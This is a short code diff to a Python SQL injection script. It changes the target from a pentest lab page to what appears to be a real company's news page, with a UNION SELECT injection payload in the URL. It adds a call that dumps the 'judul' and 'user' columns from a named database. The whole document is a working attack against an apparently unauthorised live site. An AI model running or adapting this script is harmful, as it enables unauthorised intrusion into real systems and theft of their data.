@@ -1,6 +1,8 @@
 from modules import Sqli
 
-SqliHelper = Sqli("http://pentest.justhumanz.me/sqli/example1.php?name=root' and 0 union select 1,*,3,4,5-- -")
+SqliHelper = Sqli("https://www.kabelindo.co.id/readnews.php?id=28%20and%200%20union%20select%201,2,*,4,5--+-")
 
 informations = SqliHelper.information()
-print(informations)
+# print(informations)
+dump_data = SqliHelper.dump_data(tables='news',columns=['judul','user'],database='u9897uwx_kabel')
+print(dump_data)
